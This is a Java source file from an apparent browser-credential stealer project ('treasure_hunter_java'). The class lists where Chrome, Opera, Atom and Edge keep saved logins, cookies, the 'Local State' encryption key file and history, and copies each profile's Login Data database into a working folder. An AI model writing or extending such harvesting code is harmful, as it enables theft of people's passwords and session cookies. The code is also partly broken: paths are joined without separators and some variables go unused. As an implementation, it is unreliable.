package com.treasure_hunter_java.decrypt;

import com.treasure_hunter_java.Main;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.HashMap;

public class CollectProfiles {

    HashMap<String, String> pathsChrome = new HashMap<>();
    HashMap<String, String> pathsOpera = new HashMap<>();
    HashMap<String, String> pathsAtom = new HashMap<>();
    HashMap<String, String> pathsEdge = new HashMap<>();

    HashMap<String, String> paths = new HashMap<>();

    String browserDirectory = "browserDirectory";
    String loginData = "Login Data";
    String cookies = "Cookies";
    String localState = "Local State";
    String dirName = "dirName";
    String history = "History";


    public void generatePathsChrome() {
        this.pathsChrome.put(browserDirectory, "AppData/Local/Google/Chrome/User Data");
        this.pathsChrome.put(loginData, "Login Data");
        this.pathsChrome.put(cookies, "Network/Cookies");
        this.pathsChrome.put(localState, "Local State");
        this.pathsChrome.put(dirName, "chrome_data");
        this.pathsChrome.put(history, "History");
    }

    public void generatePathsOpera() {
        this.pathsOpera.put(browserDirectory, "Roaming/Opera Software/Opera Stable");
        this.pathsOpera.put(loginData, "Login Data");
        this.pathsOpera.put(cookies, "Network/Cookies");
        this.pathsOpera.put(localState, "Local State");
        this.pathsOpera.put(dirName, "opera_data");
        this.pathsOpera.put(history, "History");
    }

    public void generatePathsAtom() {
        this.pathsAtom.put(browserDirectory, "Local/Mail.Ru/Atom/User Data");
        this.pathsAtom.put(loginData, "Login Data");
        this.pathsAtom.put(cookies, "Network/Cookies");
        this.pathsAtom.put(localState, "Local State");
        this.pathsAtom.put(dirName, "atom_data");
        this.pathsAtom.put(history, "History");
    }

    public void generatePathsEdge() {
        this.pathsEdge.put(browserDirectory, "Local/Microsoft/Edge/User Data");
        this.pathsEdge.put(loginData, "Login Data");
        this.pathsEdge.put(cookies, "Network/Cookies");
        this.pathsEdge.put(localState, "Local State");
        this.pathsEdge.put(dirName, "edge_data");
        this.pathsEdge.put(history, "History");
    }

    /*public void generatePathsToProfile() {
        Path path = Paths.get(System.getProperty("user.home"));
        for (int i = 1; i < 11; i++) {
            this.pathsToProfile.add(Path.of(path + "/AppData/Local/Google/Chrome/User Data/Profile " + i));
        }
        this.pathsToProfile.add(Path.of(path + "/AppData/Local/Google/Chrome/User Data/Default"));
        System.out.println(pathsToProfile);
    }
    */
    /*public void copyFiles() throws IOException {
        Path localStatePath = Path.of(System.getProperty("user.home") + "AppData/Local/Google/Chrome/User Data/Local State");
        for (Path path : pathsToProfile) {
            Path loginDataPath = Paths.get(String.valueOf(path), "Login Data");
            if (Files.exists(loginDataPath) && !Files.exists(HelloApplication.mainWorkDirectory.resolve("Login Data"))) {
                Files.copy(loginDataPath, HelloApplication.mainWorkDirectory.resolve("Login Data"), StandardCopyOption.REPLACE_EXISTING);
            }
        }
        //Files.copy(localStatePath, HelloApplication.mainWorkDirectory.resolve("Local State"), StandardCopyOption.REPLACE_EXISTING);
    }


    */
    /*
    public void generatePaths(){
        for (int i = 1; i < n; i++){      //n - кол-во профилей, мб пользователь будет указывать
            this.pathsToProfile.add(Path.of(path + "Profile {i}"));
            this.pathsToProfile.add("Default");
            this.pathsToProfile.add("")
        }
    }
    */
    public void copyFiles(HashMap<String, String> paths) throws IOException {
        Path mainWorkDir = Main.mainWorkDirectory;
        ArrayList<Path> pathsToProfile = new ArrayList<>();
        Path localStatePath = Path.of(System.getProperty("user.home") + paths.get("browserDirectory") + paths.get("Local State"));
        for (int i = 1; i < 10; i++) {      //n - кол-во профилей, мб пользователь будет указывать
            String path = System.getProperty("user.home") + paths.get("browserDirectory");
            pathsToProfile.add(Path.of(path + "/Profile " + i));
            System.out.println(Path.of(path + "/Profile " + i));
            pathsToProfile.add(Path.of(path + "/Default"));
            pathsToProfile.add(Path.of(path + "/"));
            //Создать папку для браузера
            File directory = new File((Main.mainWorkDirectory).toString() + paths.get("dirName"));
            if (!directory.exists()) {
                directory.mkdir();
            }
            for (Path profile : pathsToProfile) {
                Path loginDataPath = Path.of(profile + paths.get("Login Data"));
                System.out.println(loginDataPath);
                if (Files.exists(loginDataPath) && !Files.exists(Path.of(directory.toURI()).resolve("Login Data"))) {
                    Files.copy(loginDataPath, Path.of(directory.toURI()).resolve("Login Data"), StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
    }
}
